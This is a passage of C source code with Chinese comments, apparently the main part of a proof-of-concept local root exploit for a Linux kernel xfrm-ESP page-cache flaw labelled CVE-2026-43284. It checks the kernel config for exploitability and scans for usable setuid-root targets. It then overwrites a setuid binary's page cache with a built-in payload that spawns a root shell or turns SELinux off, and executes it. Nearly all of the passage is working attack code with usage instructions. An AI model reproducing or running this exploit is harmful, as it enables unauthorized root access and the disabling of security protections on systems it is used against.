 */
static int config_lookup(const char *mem, const char *name)
{
	size_t nl = strlen(name);
	const char *p = mem;

	while (p && *p) {
		if (strncmp(p, name, nl) == 0) {
			char c = p[nl];

			if (c == '=') {
				char v = p[nl + 1];

				if (v == 'y' || v == 'Y')
					return 2;
				if (v == 'm' || v == 'M')
					return 1;
				return 0;   /* "=n" 或未知值 */
			}
			/* "# CONFIG_X is not set" */
			if ((c == ' ' || c == '\t') &&
			    strncmp(p, "# ", 2) == 0 &&
			    strstr(p, "is not set"))
				return 0;
		}
		p = strchr(p, '\n');
		if (!p)
			break;
		p++;
	}
	return 0;
}

/*
 * 检测一个内核模块是否已动态加载。
 * 读 /proc/modules (每行首列即模块名), 命中返回 1;
 * 文件打不开 / 找不到返回 -1 (无法判断, 常见于容器或精简镜像);
 * 否则返回 0 (未加载)。
 *
 * 注意: /proc/modules 只列动态加载的模块, 不含 built-in。
 * 但 config=m 意味着该选项就是模块, built-in 情形不会发生, 故无需查 /sys/module。
 * 模块多由内核在 NEWSA 时 request_module 自动按需加载, 所以未加载不等于致命,
 * 这里只做提示, 不计入硬失败。
 */
static int module_loaded(const char *modname)
{
	FILE *f = fopen("/proc/modules", "r");
	char line[512];
	int rc = -1;

	if (!f)
		return -1;
	while (fgets(line, sizeof(line), f)) {
		char *sp = line;

		/* 截到第一个空白, 取出模块名 (首列) */
		while (*sp && *sp != ' ' && *sp != '\t' && *sp != '\n')
			sp++;
		*sp = '\0';
		if (strcmp(line, modname) == 0) {
			rc = 1;
			break;
		}
	}
	if (rc == -1)
		rc = 0;
	fclose(f);
	return rc;
}

static int kernel_config_check(void)
{
	char path[1024];
	const char *cfg;
	char *mem;
	struct utsname ut;
	int pass = 0, fail = 0, total_req = 0, mod_warn = 0;
	size_t i;

	if (uname(&ut) == 0)
		pmsg("[*] 运行内核: %s (本 exp 编写目标: 4.14.186)\n",
		       ut.release);

	cfg = find_config(path, sizeof(path));
	if (!cfg) {
		pmsg("[-] 找不到内核配置文件。已尝试:\n");
		pmsg("       /proc/config.gz  (/boot/config-* 源)\n");
		pmsg("       /boot/config-<release>\n");
		pmsg("       /lib/modules/<release>/build/.config\n");
		pmsg("       /usr/src/linux-headers-<release>/.config\n");
		pmsg("[-] 若 /proc/config.gz 缺失, 需内核开启 CONFIG_IKCONFIG_PROC;\n");
		pmsg("     /boot 下无 config 则本机没有留存, 请换台能取到配置的内核。\n");
		return 1;
	}
	pmsg("[*] 配置文件: %s\n", cfg);

	mem = read_config_to_mem(cfg);
	if (!mem) {
		pmsg("[-] 读取配置失败: %s\n", strerror(errno));
		pmsg("[-] (gzip 解压 /proc/config.gz 失败? 确认系统有 gzip)\n");
		return 1;
	}

	pmsg("\n%s 必需配置 (y 或 m 即视为通过; 若为 m 进一步检测模块是否加载)%s\n",
	       color_enabled() ? CLR_GREEN : "",
	       color_enabled() ? CLR_RST : "");
	for (i = 0; g_cfg_reqs[i].name; i++) {
		const struct cfg_req *r = &g_cfg_reqs[i];
		char statebuf[48];
		const char *tag;
		int v, ml = 0;

		if (!r->required)
			continue;
		v = config_lookup(mem, r->name);
		if (v == 2) {
			snprintf(statebuf, sizeof(statebuf), "y  (built-in)");
			tag = "[+]";
		} else if (v == 1 && r->modname) {
			ml = module_loaded(r->modname);
			if (ml == 1) {
				snprintf(statebuf, sizeof(statebuf),
					 "m  (模块 %s 已加载)", r->modname);
				tag = "[+]";
			} else if (ml == 0) {
				snprintf(statebuf, sizeof(statebuf),
					 "m  (模块 %s 未加载!)", r->modname);
				tag = "[!]";
				mod_warn++;
			} else {
				snprintf(statebuf, sizeof(statebuf),
					 "m  (模块 %s 无法判断)", r->modname);
				tag = "[!]";
			}
		} else if (v == 1) {
			snprintf(statebuf, sizeof(statebuf), "m  (module)");
			tag = "[+]";
		} else {
			snprintf(statebuf, sizeof(statebuf), "n / 缺失");
			tag = "[-]";
		}
		pmsg("%s %-22s %-26s %s\n",
		       tag, r->name, statebuf, r->desc);
		total_req++;
		if (v)
			pass++;
		else
			fail++;
	}

	pmsg("\n%s 建议/诊断配置 (非必须)%s\n",
	       color_enabled() ? CLR_CYAN : "",
	       color_enabled() ? CLR_RST : "");
	for (i = 0; g_cfg_reqs[i].name; i++) {
		const struct cfg_req *r = &g_cfg_reqs[i];
		char statebuf[48];
		const char *tag;
		int v, ml = 0;

		if (r->required)
			continue;
		v = config_lookup(mem, r->name);
		if (v == 2) {
			snprintf(statebuf, sizeof(statebuf), "y  (built-in)");
			tag = "[*]";
		} else if (v == 1 && r->modname) {
			ml = module_loaded(r->modname);
			if (ml == 1) {
				snprintf(statebuf, sizeof(statebuf),
					 "m  (模块 %s 已加载)", r->modname);
				tag = "[*]";
			} else if (ml == 0) {
				snprintf(statebuf, sizeof(statebuf),
					 "m  (模块 %s 未加载)", r->modname);
				tag = "[!]";
			} else {
				snprintf(statebuf, sizeof(statebuf),
					 "m  (模块 %s 无法判断)", r->modname);
				tag = "[!]";
			}
		} else if (v == 1) {
			snprintf(statebuf, sizeof(statebuf), "m  (module)");
			tag = "[*]";
		} else {
			snprintf(statebuf, sizeof(statebuf), "n / 缺失");
			tag = "[!]";
		}
		pmsg("%s %-22s %-26s %s\n",
		       tag, r->name, statebuf, r->desc);
	}

	free(mem);

	pmsg("\n[*] 结论: 必需配置 %d/%d 通过", pass, total_req);
	if (fail == 0) {
		pmsg(" —— 配置层面具备利用条件。\n");
		pmsg("[*] 仍建议跑一次 -test 验证原语真的能改写 page cache\n");
		pmsg("[*] (配置存在 ≠ 漏洞存在: 4.14.186 之后若加了 "
		       "skb_has_shared_frag 回退则已修复)。\n");
	} else {
		pmsg(" —— 有 %d 项未满足, 漏洞利用链无法成立。\n", fail);
	}

	if (mod_warn) {
		pmsg("\n[!] %d 个必需配置是模块(m)但未加载: 利用时内核通常会在 "
		       "注册 SA 时按需 request_module 自动加载;\n", mod_warn);
		pmsg("    若系统禁用了自动加载 (modules_disabled / 找不到 "
		       "modprobe), 需先手动 modprobe 对应模块再运行本 exp。\n");
	}

	pmsg("[*] 注: 即便 CONFIG_USER_NS=y, 部分发行版用 "
	       "sysctl kernel.unprivileged_userns_clone=0\n");
	pmsg("    禁用了非特权 userns, 此时需 root/CAP_NET_ADMIN 并以 "
	       "-no-userns 运行。\n");
	return fail ? 1 : 0;
}

/* ======================================================================== */
/* -find: 扫描 setuid root 文件                                             */
/*   等价 find / -perm -4000 -user root, 但顺带评估可用性:                  */
/*   大小是否够放 payload / 是否 ELF / 是符号链接的提示风险                  */
/* ======================================================================== */

#define SCAN_MIN_SIZE   1024   /* 粗判下限: 小于此值放不下内置 payload */
#define SCAN_MAX_DEPTH  64

static int g_scan_total;
static int g_scan_usable;

/* ---- 挂载表: 判断候选是否 nosuid / 只读镜像 ---- */
#define MAX_MNTS 256

struct mnt_ent {
	char dir[PATH_MAX];
	char fstype[64];
	int nosuid;
	int ro;
};

static struct mnt_ent g_mnts[MAX_MNTS];
static int g_nmnts;

static int opt_has(const char *opts, const char *name)
{
	const char *p = opts;
	size_t n = strlen(name);

	while (*p) {
		const char *e = strchr(p, ',');

		if (!e)
			e = p + strlen(p);
		if ((size_t)(e - p) == n && !strncmp(p, name, n))
			return 1;
		if (!*e)
			break;
		p = e + 1;
	}
	return 0;
}

static void load_mounts(void)
{
	FILE *f = fopen("/proc/mounts", "r");
	char line[8192];

	if (!f)
		f = fopen("/proc/self/mounts", "r");
	if (!f)
		return;
	while (fgets(line, sizeof(line), f) && g_nmnts < MAX_MNTS) {
		char dev[256], dir[PATH_MAX], fstype[64], opts[2048];
		struct mnt_ent *m;

		if (sscanf(line, "%255s %4095s %63s %2047s",
			   dev, dir, fstype, opts) != 4)
			continue;
		m = &g_mnts[g_nmnts++];
		snprintf(m->dir, sizeof(m->dir), "%s", dir);
		snprintf(m->fstype, sizeof(m->fstype), "%s", fstype);
		m->nosuid = opt_has(opts, "nosuid");
		m->ro = opt_has(opts, "ro");
	}
	fclose(f);
}

/* 找 path 所属挂载点 (最长前缀匹配) */
static const struct mnt_ent *mnt_for(const char *path)
{
	const struct mnt_ent *best = NULL;
	size_t bestlen = 0;
	int i;

	for (i = 0; i < g_nmnts; i++) {
		const struct mnt_ent *m = &g_mnts[i];
		size_t dl = strlen(m->dir);

		if (dl == 1 && m->dir[0] == '/') {
			if (!best || dl >= bestlen) {
				best = m;
				bestlen = dl;
			}
			continue;
		}
		if (!strncmp(path, m->dir, dl) &&
		    (path[dl] == '/' || path[dl] == '\0')) {
			if (dl >= bestlen) {
				best = m;
				bestlen = dl;
			}
		}
	}
	return best;
}

static int fs_is_readonly_image(const char *fstype)
{
	return !strcmp(fstype, "squashfs") || !strcmp(fstype, "iso9660") ||
	       !strcmp(fstype, "erofs") || !strcmp(fstype, "cramfs");
}

static void fmt_size(char *buf, size_t sz, long long n)
{
	if (n >= 1024 * 1024)
		snprintf(buf, sz, "%.1fM", (double)n / 1048576.0);
	else if (n >= 1024)
		snprintf(buf, sz, "%.0fK", (double)n / 1024.0);
	else
		snprintf(buf, sz, "%lldB", n);
}

/* 读 ELF 头, 给一句类型描述 (ELF64 EXEC / ELF64 DYN / 非ELF ...) */
static void elf_brief(const char *path, char *desc, size_t descsz)
{
	unsigned char h[20];
	uint16_t et = 0;
	const char *cls, *typ;
	int fd, n;

	fd = open(path, O_RDONLY);
	if (fd < 0) {
		snprintf(desc, descsz, "?");
		return;
	}
	n = (int)read(fd, h, sizeof(h));
	close(fd);
	if (n < 18 || memcmp(h, ELFMAG, SELFMAG) != 0) {
		snprintf(desc, descsz, "非ELF");
		return;
	}
	cls = h[EI_CLASS] == ELFCLASS64 ? "ELF64" :
	      h[EI_CLASS] == ELFCLASS32 ? "ELF32" : "ELF?";
	memcpy(&et, h + 16, 2);   /* e_type 在 e_ident 之后, 偏移 16 */
	typ = et == ET_EXEC ? "EXEC" : et == ET_DYN ? "DYN" : "?";
	snprintf(desc, descsz, "%s %s", cls, typ);
}

static void scan_report(const char *path, const struct stat *st)
{
	const struct mnt_ent *m = mnt_for(path);
	char sz[32], desc[32], note[96];
	int nosuid = m && m->nosuid;
	int roimg = m && (m->ro || fs_is_readonly_image(m->fstype));
	int usable;

	if (!S_ISREG(st->st_mode))
		return;   /* lstat 下符号链接不带 setuid 位, 这里基本只处理普通文件 */
	fmt_size(sz, sizeof(sz), (long long)st->st_size);
	elf_brief(path, desc, sizeof(desc));

	if (st->st_size < SCAN_MIN_SIZE)
		snprintf(note, sizeof(note), "太小");
	else if (nosuid)
		snprintf(note, sizeof(note), "nosuid: setuid 不生效");
	else if (roimg)
		snprintf(note, sizeof(note), "只读fs(%s)",
			 m ? m->fstype : "?");
	else
		snprintf(note, sizeof(note), "可作目标");

	usable = st->st_size >= SCAN_MIN_SIZE && !nosuid && !roimg;
	g_scan_total++;
	if (usable)
		g_scan_usable++;
	pmsg("%s %-44s %8s  %-11s %s\n",
	       usable ? "[+]" : "[!]", path, sz, desc, note);
}

static int dir_skipped(const char *name)
{
	static const char *skip[] = {
		"proc", "sys", "dev", "run", "tmp", NULL
	};
	int i;

	for (i = 0; skip[i]; i++)
		if (!strcmp(name, skip[i]))
			return 1;
	return 0;
}

static void scan_dir(const char *dir, int depth)
{
	DIR *d;
	struct dirent *de;

	if (depth > SCAN_MAX_DEPTH)
		return;
	d = opendir(dir);
	if (!d)
		return;
	while ((de = readdir(d))) {
		char path[PATH_MAX];
		struct stat st;
		int len;

		if (de->d_name[0] == '.' &&
		    (de->d_name[1] == '\0' ||
		     (de->d_name[1] == '.' && de->d_name[2] == '\0')))
			continue;
		if (dir_skipped(de->d_name))
			continue;
		if (!strcmp(dir, "/"))
			len = snprintf(path, sizeof(path), "/%s", de->d_name);
		else
			len = snprintf(path, sizeof(path), "%s/%s",
				       dir, de->d_name);
		if (len < 0 || len >= (int)sizeof(path))
			continue;
		if (lstat(path, &st) < 0)
			continue;
		if (S_ISDIR(st.st_mode))
			scan_dir(path, depth + 1);
		else if ((st.st_mode & S_ISUID) && st.st_uid == 0)
			scan_report(path, &st);
	}
	closedir(d);
}

static int scan_setuid_files(void)
{
	long long t0 = now_ms();

	load_mounts();
	pmsg("[*] 扫描 setuid root 文件 (等价 find / -perm -4000 -user root,\n"
	       "    跳过 /proc /sys /dev /run /tmp) ...\n\n");
	scan_dir("/", 0);
	pmsg("\n[*] 共 %d 个 setuid root 普通文件, 其中 %d 个真正可用 "
	       "(>=%d 字节, 且非 nosuid / 只读镜像)\n",
	       g_scan_total, g_scan_usable, SCAN_MIN_SIZE);
	pmsg("[!] nosuid: execve 忽略 setuid, 写了也不提权; "
	       "只读fs: 页缓存写回通常失败\n");
	if (g_scan_usable) {
		pmsg("[*] 用法: ./poc -root-shell -to <上面 [+] 的某个路径>\n");
		pmsg("    建议先加 -noexec 空跑, 确认回读校验通过再真执行; "
		       "实际所需大小取决于 payload\n");
	}
	pmsg("[*] 耗时 %lld ms\n", now_ms() - t0);
	return g_scan_usable ? 0 : 1;
}

/* ======================================================================== */
/* main                                                                     */
/* ======================================================================== */

static void usage(const char *p)
{
	pmsg("CVE-2026-43284 (DirtyFrag / xfrm-ESP) PoC\n\n");
	pmsg("用法:\n");
	pmsg("  %s -to <目标文件> -set <替换内容文件>      分批写入, 默认执行\n", p);
	pmsg("  %s -to <目标文件> -set <替换内容文件> -noexec\n", p);
	pmsg("  %s -disable_selinux -to <setuid root>     内置 payload: setenforce 0\n", p);
	pmsg("  %s -disable_selinux                       已是 root 时直接写 sysfs\n", p);
	pmsg("  %s -root-shell -to <setuid root>         内置 payload: setuid(0)+/bin/sh\n", p);
	pmsg("  %s -test                                  自测, 不碰系统文件\n\n", p);
	pmsg("选项:\n");
	pmsg("  -to <path>   要写的文件 (setuid root, 全局可读)\n");
	pmsg("  -set <path>  替换内容, 从目标 -offset 处开始覆盖, 4 字节对齐\n");
	pmsg("  -offset <n>  目标文件写入起始偏移, 默认 0, 支持 0x 前缀\n");
	pmsg("  -disable_selinux  写入内置 payload 关闭 SELinux;\n");
	pmsg("                    非 root 需配 -to <setuid root 文件>, 不能与 -set 同用\n");
	pmsg("  -root-shell  写入内置 payload, 执行后得到 root shell;\n");
	pmsg("               需要 -to <setuid root 文件>, 不能与 -set 同用\n");
	pmsg("  -noexec      写完后不执行目标\n");
	pmsg("  -find        扫描 setuid root 文件 (等价 find / -perm -4000 -user root)\n");
	pmsg("  -check       检查内核配置 (y/m 即过); 若为模块(m)则进一步检测是否已加载\n");
	pmsg("  -force       允许 -to 是符号链接 (危险, 可能写坏 busybox)\n");
	pmsg("  -nobackup    写入前不备份目标文件 (默认会备份到 /tmp)\n");
	pmsg("  -delay <ms>  每批触发后等待, 默认 20\n");
	pmsg("  -v           详细日志\n");
	pmsg("  -no-userns   已是 root/CAP_NET_ADMIN, 不 unshare\n");
	pmsg("  -h           帮助\n");
}

int main(int argc, char **argv)
{
	const char *to = NULL, *set = NULL;
	off_t base_off = 0;
	int no_userns = 0, noexec = 0, test = 0, disable_selinux = 0;
	int root_shell = 0, check = 0, no_backup = 0, find_mode = 0;
	int i;
	long long t_all = now_ms();

	for (i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "-v")) {
			g_verbose = 1;
		} else if (!strcmp(argv[i], "-no-userns")) {
			no_userns = 1;
		} else if (!strcmp(argv[i], "-noexec")) {
			noexec = 1;
		} else if (!strcmp(argv[i], "-force")) {
			g_force = 1;
		} else if (!strcmp(argv[i], "-nobackup")) {
			no_backup = 1;
		} else if (!strcmp(argv[i], "-delay") && i + 1 < argc) {
			g_delay_ms = atoi(argv[++i]);
			if (g_delay_ms < 0)
				g_delay_ms = 0;
		} else if (!strcmp(argv[i], "-offset") && i + 1 < argc) {
			char *endp = NULL;
			long long v = strtoll(argv[++i], &endp, 0);

			if (!endp || *endp != '\0' || v < 0) {
				pmsg("[-] -offset 需要非负整数 (支持 0x 前缀)\n");
				return 1;
			}
			base_off = (off_t)v;
		} else if (!strcmp(argv[i], "-test")) {
			test = 1;
		} else if (!strcmp(argv[i], "-check")) {
			check = 1;
		} else if (!strcmp(argv[i], "-find")) {
			find_mode = 1;
		} else if (!strcmp(argv[i], "-disable_selinux")) {
			disable_selinux = 1;
		} else if (!strcmp(argv[i], "-root-shell")) {
			root_shell = 1;
		} else if (!strcmp(argv[i], "-to") && i + 1 < argc) {
			to = argv[++i];
		} else if (!strcmp(argv[i], "-set") && i + 1 < argc) {
			set = argv[++i];
		} else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) {
			usage(argv[0]);
			return 0;
		} else {
			pmsg("未知参数: %s\n", argv[i]);
			usage(argv[0]);
			return 1;
		}
	}

	if (find_mode)
		return scan_setuid_files();

	if (check)
		return kernel_config_check();

	if (test)
		return selftest(no_userns);

	/* 内置 payload 与 -set 互斥, 两个内置 payload 也不能同时用 */
	if ((disable_selinux || root_shell) && set) {
		pmsg("[-] 内置 payload (-disable_selinux / -root-shell) 不能与 -set 同时使用\n");
		return 1;
	}
	if (disable_selinux && root_shell) {
		pmsg("[-] -disable_selinux 与 -root-shell 不能同时使用\n");
		return 1;
	}
	if ((disable_selinux || root_shell) && base_off != 0) {
		pmsg("[-] 内置 payload 是完整 ELF, 只支持 -offset 0\n");
		return 1;
	}
	if (root_shell && !to) {
		pmsg("[-] -root-shell 需要 -to <setuid root 文件>\n");
		return 1;
	}

	/*
	 * 已经是 root 就没必要走漏洞: 直接写 sysfs。
	 * 给了 -to 则按用户要求走 page-cache 写入 + execve 流程。
	 */
	if (disable_selinux && !to) {
		int cur;

		if (selinux_missing()) {
			pmsg("[-] 未找到 %s 文件，系统可能没有 selinux...\n",
			       SELINUX_ENFORCE);
			return 1;
		}
		if (geteuid() != 0) {
			pmsg("[-] 当前不是 root, 必须用 -to <setuid root 文件> 走写入流程\n");
			return 1;
		}
		cur = selinux_get_enforce();
		if (cur < 0)
			pmsg("[*] euid=0, 读不到 %s, 直接尝试写入\n", SELINUX_ENFORCE);
		else
			pmsg("[*] euid=0, 当前 enforce=%d, 直接写 %s\n",
			       cur, SELINUX_ENFORCE);
		return selinux_disable_direct() == 0 ? 0 : 1;
	}

	if (!to || (!set && !disable_selinux && !root_shell)) {
		usage(argv[0]);
		return 1;
	}

	{
		uint8_t *data = NULL;
		size_t len = 0;
		pid_t pid;
		int st = 0, is_suid = 0, have_backup = 0;
		char backup_path[PATH_MAX];

		if (disable_selinux) {
			if (build_disable_selinux_payload(&data, &len) < 0)
				return 1;
		} else if (root_shell) {
			if (build_root_shell_payload(&data, &len) < 0)
				return 1;
		} else if (load_payload(set, &data, &len) < 0) {
			return 1;
		}

		check_payload_elf(data, len);
		if (check_target(to, &is_suid) < 0) {
			free(data);
			return 1;
		}
		(void)is_suid;

		/*
		 * 写入前备份目标: 原语一旦部分失败, 目标 ELF 就被写坏,
		 * 系统里那个 setuid 程序即不可用。有备份至少能事后恢复。
		 */
		if (!no_backup) {
			if (backup_file(to, backup_path,
					sizeof(backup_path)) == 0) {
				have_backup = 1;
				pmsg("[*] 已备份目标文件 -> %s\n", backup_path);
			} else {
				pmsg("[!] 备份失败 (%s), 继续写入 "
				       "(如需跳过备份可加 -nobackup)\n",
				       strerror(errno));
			}
		}

		/* 没有 SELinux 就没有必要继续写, 直接给出提示 */
		if (disable_selinux && selinux_missing()) {
			pmsg("[-] 未找到 %s 文件，系统可能没有 selinux...\n",
			       SELINUX_ENFORCE);
			free(data);
			return 1;
		}

		/*
		 * 关键: 写 page cache 的子进程可以进 user namespace 拿
		 * CAP_NET_ADMIN; 但 execve 必须由仍留在原始 user namespace
		 * 的父进程来做。
		 *
		 * 原因: execve 一个 setuid-root 文件时, 4.14 的
		 * bprm_fill_uid() 有
		 *     if (!kuid_has_mapping(user_ns, uid)) return;
		 * 子 userns 只映射了 "0 -> 真实uid", 全局 kuid 0 无映射,
		 * 于是 setuid 位被静默忽略, 只拿到真实 uid。
		 * page cache 是全局的, 子进程改完退出不影响父进程读取。
		 */
		fflush(NULL);
		pmsg("[*] fork 子进程: 进入 userns/netns 写 page cache ...\n");
		pid = fork();
		if (pid < 0) {
			pmsg("[-] fork: %s\n", strerror(errno));
			free(data);
			return 1;
		}
		if (pid == 0) {
			int rc = 0;

			if (setup_userns_netns(no_userns) < 0)
				rc = 2;
			else if (write_payload(to, data, len, base_off) < 0)
				rc = 3;
			fflush(NULL);
			_exit(rc);
		}

		if (waitpid(pid, &st, 0) < 0) {
			pmsg("[-] waitpid: %s\n", strerror(errno));
			free(data);
			return 1;
		}
		if (!WIFEXITED(st) || WEXITSTATUS(st) != 0) {
			pmsg("[-] 写入子进程失败 (status=0x%x)\n", st);
			if (have_backup)
				try_restore(backup_path, to);
			free(data);
			return 1;
		}

		/* 父进程在原 userns 里回读, 走的是同一份 page cache */
		if (verify_payload(to, data, len, base_off) < 0) {
			if (have_backup)
				try_restore(backup_path, to);
			free(data);
			return 1;
		}
		if (have_backup)
			pmsg("[*] 原文件备份保留在 %s (需要时可恢复)\n",
			       backup_path);
		free(data);
		pmsg("[*] 写入+校验完成, 总耗时 %lld ms\n", now_ms() - t_all);
	}

	if (noexec) {
		pmsg("[*] -noexec: 不执行。手动运行 %s 即可。\n", to);
		return 0;
	}

	pmsg("[*] execve(%s) ...\n", to);
	fflush(NULL);

	if (disable_selinux) {
		pid_t cpid;
		int cst = 0, cur;

		/*
		 * 子进程 exec 目标 (setuid 位生效 -> euid 0 -> 内置 payload
		 * 写 enforce); 父进程留在原 userns 等它退出后回读状态。
		 */
		cpid = fork();
		if (cpid < 0) {
			pmsg("[-] fork: %s\n", strerror(errno));
			return 1;
		}
		if (cpid == 0) {
			char *const argv2[] = { (char *)to, NULL };
			char *const envp[]  = { NULL };

			execve(to, argv2, envp);
			_exit(127);
		}
		if (waitpid(cpid, &cst, 0) < 0) {
			pmsg("[-] waitpid: %s\n", strerror(errno));
			return 1;
		}
		if (!WIFEXITED(cst) || WEXITSTATUS(cst) != 0)
			pmsg("[!] payload 退出异常 (status=0x%x)\n", cst);

		cur = selinux_get_enforce();
		if (cur == 0) {
			pmsg("[+] SELinux 已关闭 (enforce=0)\n");
			return 0;
		}
		if (cur < 0) {
			pmsg("[-] 读不到 %s, 无法确认结果\n", SELINUX_ENFORCE);
			return 1;
		}
		pmsg("[-] SELinux 仍为 enforce=%d, payload 没有写成功\n", cur);
		pmsg("    常见原因:\n");
		pmsg("      1) 目标挂载点带 nosuid, setuid 位被忽略, 进程不是 root\n");
		pmsg("      2) 当前 SELinux 域不允许写 security 节点\n");
		pmsg("      3) /sys/fs/selinux 不存在 (内核未启用 SELinux)\n");
		return 1;
	}

	{
		char *const argv2[] = { (char *)to, NULL };
		char *const envp[]  = { NULL };

		execve(to, argv2, envp);
	}
	pmsg("[-] execve: %s\n", strerror(errno));
	return 1;
}
